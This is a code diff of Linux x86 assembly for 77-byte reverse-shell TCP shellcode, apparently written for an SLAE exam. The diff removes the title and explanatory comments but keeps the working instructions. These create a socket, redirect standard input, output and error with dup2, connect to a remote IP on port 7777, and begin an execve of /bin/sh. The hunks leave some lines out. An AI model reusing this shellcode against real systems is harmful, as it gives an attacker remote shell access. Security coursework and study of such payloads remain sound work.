@@ -1,22 +1,8 @@
-; Title: Linux x86 Reverse Shell TCP shellcode (77 bytes)
-; Author: Guillaume Kaddouch
-; SLAE-681
-
 global _start
 
 section .text
 
 _start:
-	; Socket creation and handling with socketcall()
-        ; socketcall(int call, unsigned long *args)
-
-        ; 1 - creating socket
-        ; int socket(int domain, int type, int protocol)
-        ; socketfd = socket(2, 1, 0)
-
-        ; eax = 0x66 = socketcall()
-        ; ebx = 0x1 = socket()
-        ; ecx = ptr to socket's args
 
         xor ebx, ebx                    ; zero out ebx
         mul ebx                         ; implicit operand eax: zero out eax
@@ -27,15 +13,6 @@ _start:
         push byte 0x2                   ; 1st arg: socket domain = 2 (AF_INET)
         mov ecx, esp                    ; copy stack structure's address to ecx (pointer)
         int 0x80                        ; eax = socket(AF_INET, SOCK_STREAM, 0)
-
-	; 2 - dup2
-        ; int dup2(int oldfd, int newfd)
-        ; duplicate our socketfd into fd from 2 to 0  (stdin = 0, stdout = 1, stderror = 2)
-        ; stdin/stdout/stderror become the TCP connection
-
-	; eax = 0x3f = dup2()
-        ; ebx = socketfd
-        ; ecx = fd (from 2 to 0)
 
 	xchg eax, ebx			; ebx = socketfd, eax = 1
 	pop ecx				; ecx = 2 (loop count)
@@ -69,17 +46,6 @@ dup_jump:
         mov bl, 0x3                     ; ebx = 3 = connect()
         mov ecx, esp                    ; save esp into ecx, points to socketfd
         int 0x80                        ; eax = connect(socketfd, *addr[2, 7777, IP], 16) = 0 (on success)
-
-
-
-  	; 4 - execve /bin/sh
-        ; execve(const char *filename, char *const argv[filename], char *const envp[])
-        ; execve(/bin//sh, &/bin//sh, 0)
-
-	; eax = 0xb = execve()
-        ; ebx = *filename
-        ; ecx = *argv
-	; edx = *envp
 
 	xor eax, eax
         push edx			; edx = 0x00000000
